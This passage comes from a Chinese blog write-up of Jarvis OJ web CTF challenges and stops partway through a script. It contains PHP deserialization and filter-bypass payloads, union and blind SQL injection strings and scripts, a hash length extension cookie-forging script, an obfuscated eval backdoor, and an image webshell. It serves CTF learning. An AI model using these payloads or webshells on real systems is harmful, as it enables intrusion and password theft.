invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;\\&#x27;</span>)===<span class="literal">FALSE</span></span><br><span class="line">&amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;pctf&#x27;</span>)===<span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤掉了<code>pctf</code>、<code>..</code>、<code>/</code>、<code>\\</code>，也就是常用的目录穿越的 payload 过滤掉了，读<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;shield.php&#x27;</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Shield</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;class&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$g</span>)) &#123;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$g</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>-&gt;<span class="title function_ invoke__">readfile</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含了一个文件，然后新建了一个对象，可以 GET 给一个参数<code>class</code>，然后反序列化<code>class</code>，读<code>shield.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file) &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span>  </span><br><span class="line">&amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;\\&#x27;</span>)==<span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提示了 flag 在<code>pctf.php</code>，知道了<code>Shield</code>类的构造方法，所以思路就是不能用<code>img</code>参数直接传<code>pctf.php</code>，因为过滤卡死了，只能用反序列化一个对象，执行对象的<code>readfile()</code>函数，序列化内容本地跑一下就出来了，最后的 payload：<code>?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</code></p><h1 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h1><p>源码中注释提示了<code>index.phps</code>，访问拿到源码，这个源码还要自己整理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?id=1&#x27;</span>); </span><br><span class="line"> <span class="keyword">exit</span>(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hahahahahaha&#x27;</span>; </span><br><span class="line">    <span class="keyword">return</span> ; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;1112 is a nice lab!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span> == <span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;flag.txt&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;work harder!harder!harder!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>考察一些常见的绕过</p><p><code>id</code>：<code>$id==0</code>，弱比较用 0e 或者输入英文字母或者给数组，都能绕过</p><p><code>a</code>：这个<code>a</code>参数和<code>file_get_contents()</code>函数的绕过姿势就很多了，最常见的是<code>php://input</code>的方式来绕过，也可以用<code>data:,</code>协议来绕过，比如<code>?a=data:,1112 is a nice lab!</code>或者<code>data://text/plain;base64,MTExMiBpcyBhIG5pY2UgbGFiIQ==</code></p><blockquote><p>参考资料</p><p><a href="https://blog.csdn.net/lxgwm2008/article/details/38437875">data类型的Url格式：把小数据直接嵌入到Url中</a></p></blockquote><p><code>b</code>：<code>strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</code>可以用<code>%00</code>截断来绕过，<code>strlen</code>函数对<code>%00</code>不截断但<code>substr</code>和<code>eregi</code>截断</p><p>得到一个目录</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218124110.png"></p><p>进来后就是简单的 sql 注入环节</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218124902.png"></p><p>双写能绕过，注释需要用<code>/*1*/</code>，1 可以是任意值，一套带走，好像记得也可以用 sqlmap 直接梭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//爆字段数：得到3</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,3#</span><br><span class="line">//爆库：得到test</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(schema_name)/*111*/frfromom/*111*/information_schema.schemata#</span><br><span class="line">//爆表：得到content</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(table_name)/*111*/frfromom/*111*/information_schema.tables/*111*/where/*111*/table_schema=0x74657374</span><br><span class="line">//爆字段：得到id,context,title</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(column_name)/*111*/frfromom/*111*/information_schema.columns/*111*/where/*111*/table_name=0x636f6e74656e74</span><br><span class="line">//爆内容：</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(context)/*111*/frfromom/*111*/test.content#</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h1><p>下载下来一个 so 文件，是 mysql UDF 开发的东西，我的理解是相当于写了一个函数库，类似于 dll ，mysql 用的时候导入</p><blockquote><p>参考资料</p><p><a href="https://blog.csdn.net/albertsh/article/details/78567661">mysql函数扩展之UDF开发</a></p><p>sql 语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION XXXXX RETURNS INTEGER SONAME &quot;YYYYY.so&quot;;1</span><br></pre></td></tr></table></figure><p>存储过程的名字叫做<code>CreateUDF</code>，当时看到这条语句很迷惑，根本不知道是做什么用的，只能在项目资源中查找<code>YYYYY.so</code>这个库文件，结果却什么也没有找到，一番努力之后我断定，项目中调用<code>CreateUDF</code>之后并没有产生任何效果。</p><p>关于UDF详细的解释和使用方法请参照MYSQL官方文档：<a href="https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html">Adding a New User-Defined Function</a></p><p>这里只做一个简单的解释：<code>UDF</code> 全称是 <code>User defined function</code>， 属于 mysql 的一个拓展接口，一般翻译为用户自定义函数，这个是用来拓展 mysql 的技术手段。</p><p>我们知道 mysql 本身提供了大量的函数，并且也支持定义函数，为什么我们还需要 UDF 呢？这主要看到了他的<strong>优点：UDF 本身的兼容性很好，并且比存储方法具有更高的执行效率，同时支持聚集函数，相比修改原代码增加函数，更加方便简单，但是UDF也处于mysqld的内存空间中，不谨慎的内存使用很容易导致mysql的服务挂掉。</strong></p></blockquote><p>复制 so 文件到<code>/usr/lib64/mysql/plugin</code>，执行语句导入，然后执行 getflag() 函数就出来了</p><h1 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h1><p>扫目录发现有<code>index.php~</code>，是 php 的备份恢复文件，改后缀名为<code>index.php.swp</code>拖 kali 里面拿 vim 打开就行，<code>vim -r 文件</code>恢复上次异常的文件，拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line"><span class="variable">$salt</span> = </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>])) &#123;</span><br><span class="line"><span class="variable">$role</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]);</span><br><span class="line"><span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$hsh</span> === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]))) &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$role</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;role&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$hsh</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;hsh&#x27;</span>,<span class="variable">$hsh</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单读一下代码逻辑</p><p>首先是设两个 cookie 一个是<code>role</code>，值是<code>$role</code>序列化后的字符串，另一个是<code>hsh</code>，值是<code>$salt</code>拼接上倒序后的<code>$s</code>（<code>$role</code>序列化后的字符串）然后进行<code>md5</code>加密</p><p>然后就是把 cookie 中的 <code>role</code>反序列化给 <code>$role</code>，<code>hsh</code>的值跟<code>md5($salt.strrev($_COOKIE[&quot;role&quot;])</code>进行强比较，就是把 cookie 中的 <code>role</code>进行倒序与<code>$salt</code>拼接再进行 <code>md5</code>加密，如果用户修改了 cookie 中的<code>role</code>，则此强比较失败</p><p>最后如果两个强比较都为真，<code>$auth</code>为真，给 flag</p><p>是一个经典的<strong>哈希长度扩展攻击</strong></p><blockquote><p>参考资料</p><p><a href="https://www.freebuf.com/articles/web/69264.html">深入理解hash长度扩展攻击（sha1为例）</a></p><p><a href="https://www.freebuf.com/articles/web/31756.html">科普哈希长度扩展攻击(Hash Length Extension Attacks)</a></p><p><a href="https://blog.csdn.net/syh_486_007/article/details/51228628?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs">hash哈希长度扩展攻击解析（记录一下，保证不忘）</a></p><p><a href="https://blog.csdn.net/szuaurora/article/details/78125585?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.baidujs">长度扩展攻击详解</a></p></blockquote><p>我对哈希长度扩展攻击的理解，看了小半个下午，感觉摸到一点头绪</p><p>举个例子简单来说，假设加密字符串<code>123456</code>，盐为<code>600</code>，加密时候，待加密字符串为<code>600123456</code>，开始补 0 ，补到长度为 4 的倍数，此时字符串为<code>600123456000</code>，然后四个四个切开求和，<code>6001+2345+6000=14346</code>作为 hash 的值，最后抹掉一位给用户，用户拿到<code>143X6</code>，<strong>此时开始长度扩展攻击</strong>，用户输入<code>1234560001234</code>，加盐以后补 0 得到<code>6001234560001234</code>，计算<code>6001+2345+6000+1234=15580</code>，用户得到一个<code>15X80</code>，现在知道了<code>15X80=143X6+1234</code>，爆破就能够得到<code>123456</code>的 hash 值为<code>14346</code></p><p>理解一下原理，就是需要 hash 的字符串在进行加密的时候，是分成几组字符子串，分组进行加密的，在这个过程中，存在<strong>覆盖</strong>的关系，当第一个字符串分组进行加密过后得到的 hash 值，它是作为下一组字符串进行 hash 加密时候的<code>registers</code>值（盐），可以理解为<code>hash(registers1+字符串组2)=registers2</code>，<strong>我理解为上一组的结果作为下一组的盐</strong>，直到最后一组进行加密完成，最后一组的<code>registers</code>值就是 hash 的最终值，<strong>因为 hash 计算结果是唯一的</strong></p><p><strong>如果 salt 的值不知道，但是知道长度，又知道 sha1(salt)，那么就也就可以知道 sha1(salt+“填充数据”+“任意可控数据”)。这里的 salt+“填充数据” 就是对 salt 进行 sha1 时所补全的数据 + 最后8位的长度描述符。一般来说，salt+”填充数据”的长度就是64字节，正好是一个分组。如果salt的长度就大于了56个字节，那么加入填充数据后的长度应该是N个64字节，等于N个分组。</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218163726.png"></p><p>理一下思路，如果进行“复杂数学变化”时输入的<code>registers</code>值和该次运算的字符串分组相同，那么他们各自生成的新的<code>registers</code>值也相同，我们现在需要伪造的 cookie 是<code>&#123;s:5:&quot;admin&quot;&#125;</code>，已知了一个<code>registers</code>值，也就是第一次加密<code>&#123;s:5:&quot;guset&quot;&#125;</code>后的 cookie ，<strong>我们需要爆破出盐的长度，然后填充成个字符串分组，让增加的<code>&#123;s:5:&quot;admin&quot;&#125;</code>字符串变成下一组字符串分组，让第一次加密后的 cookie 当作加密<code>&#123;s:5:&quot;admin&quot;&#125;</code>时候的盐</strong>，这样就能绕过了</p><p>最后的脚本来自百度，还有一个要注意的点就是，<strong>PHP在反序列化时，会忽略后面多余的字符</strong>，如果我们的 <code>role</code>为<code> &#123;&#39;s:5:&quot;admin&quot;;\x00\x00\x00\x00\x00\x00\x00\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80s:5:&quot;guest&quot;;&#39;&#125;</code>，反序列化时只有<code>&#123;s:5:&quot;admin&quot;&#125;</code>这些内容被解析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,hashpumpy,urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span></span><br><span class="line"></span><br><span class="line">    old_cookie = <span class="string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span></span><br><span class="line">    str1 = <span class="string">&#x27;s:5:&quot;guest&quot;;&#x27;</span></span><br><span class="line">    str2 = <span class="string">&#x27;s:5:&quot;admin&quot;;&#x27;</span></span><br><span class="line">    str1 = str1[::-<span class="number">1</span>]                           <span class="comment">#倒过来,这道题要role的值反过来求md5</span></span><br><span class="line">    str2 = str2[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):                       <span class="comment">#用于爆破salt的长度</span></span><br><span class="line">        new_cookie,message = hashpumpy.hashpump(old_cookie,str1,str2,i)</span><br><span class="line">        payload = &#123;<span class="string">&#x27;role&#x27;</span>:urllib.parse.quote(message[::-<span class="number">1</span>]),<span class="string">&#x27;hsh&#x27;</span>:new_cookie&#125;           <span class="comment">#quote()可以把 \x00 变成 %00</span></span><br><span class="line">        ans = requests.get(url,cookies = payload)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(ans.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">in</span> ans.text:</span><br><span class="line">            <span class="built_in">print</span>(ans.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(urllib.parse.quote(&#x27;\x00&#x27;))</span></span><br><span class="line">attack()</span><br></pre></td></tr></table></figure><h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><p>进去一个菜刀的图片，然后有个管理员登陆的按钮，点进去弹登陆错误，源码中有提示管理员的 IP ：<code>&#39;admin ip is 202.5.19.128&#39;</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218193537.png"></p><p>菜刀目录下的源码中有提示一个<code>proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</code></p><p>所以就是套了一层娃，接下来就是扫目录扫到一个<code>robots.txt</code>然后里面有两个文件名字<code>trojan.php</code>和<code>trojan.php.txt</code>，后者里面是个🐎</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;=(<span class="string">&quot;!&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;(</span></span><br><span class="line"><span class="string">&quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;[&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;;&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;*&quot;</span>^<span class="string">&quot;~&quot;</span>);$&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;</span><br><span class="line">((<span class="string">&quot;-&quot;</span>^<span class="string">&quot;H&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;+&quot;</span>). (<span class="string">&quot;[&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;,&quot;</span>^<span class="string">&quot;@&quot;</span>). (<span class="string">&quot;&#125;&quot;</span>^<span class="string">&quot;U&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;A&quot;</span>). (<span class="string">&quot;(&quot;</span>^<span class="string">&quot;w&quot;</span>).</span><br><span class="line">(<span class="string">&quot;j&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;i&quot;</span>^<span class="string">&quot;&amp;&quot;</span>). (<span class="string">&quot;#&quot;</span>^<span class="string">&quot;p&quot;</span>). (<span class="string">&quot;&gt;&quot;</span>^<span class="string">&quot;j&quot;</span>). (<span class="string">&quot;!&quot;</span>^<span class="string">&quot;z&quot;</span>). (<span class="string">&quot;T&quot;</span>^<span class="string">&quot;g&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;S&quot;</span>).</span><br><span class="line">(<span class="string">&quot;_&quot;</span>^<span class="string">&quot;o&quot;</span>). (<span class="string">&quot;?&quot;</span>^<span class="string">&quot;b&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;t&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">上述代码保存为php页面运行一下，得到Warning：</span><br><span class="line">Warning: <span class="title function_ invoke__">assert</span>() [function.assert]: Assertion <span class="string">&quot;eval(<span class="subst">$_POST</span>[360])&quot;</span> failed</span><br><span class="line">in C:\phpstudy\WWW\b.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>trojan.php</code>是 shell 的页面，蚁剑连就行了</p><h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><p>文件上传</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218202805.png"></p><p>传了一个经典的图片🐎，得到了<code>图片ID：1613651325 </code>，路径是<code>/uploads/xxxxxx.jpg</code>，在<code>view</code>页面的 url 有<code>?page=view</code>，猜测 page 参数的值是一个路径，填了图片的路径，然后有报错，会给文件自动添加<code>.php</code>后缀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ma2.jpg</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt; </span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218202947.png"></p><p>但是在<code>view</code>页面直接填写图片 ID 和图片类型就可以访问到图片</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218203440.png"></p><p>蚁剑连不上，最后是用<code>%00</code>截断拿到 flag</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218203824.png"></p><h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p>有<code>用户名错误</code>和<code>密码错误</code>两种回显，所以确定有<code>admin</code>账号，fuzz 出来空格被过滤，可以用<code>/**/</code>代替，盲注打出密码</p><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.jarvisoj.com:32787/login.php&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;密码错误&quot;</span></span><br><span class="line">chars = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;start!&#x27;</span>)</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;user&#x27;/**/or/**/mid((select/**/password/**/from/**/admin),%s,1)=&#x27;%s&#x27;#&quot;</span> % (i, j),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;1&#x27;#&quot;</span>&#125;</span><br><span class="line">        res = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> res:</span><br><span class="line">            password += j</span><br><span class="line">            <span 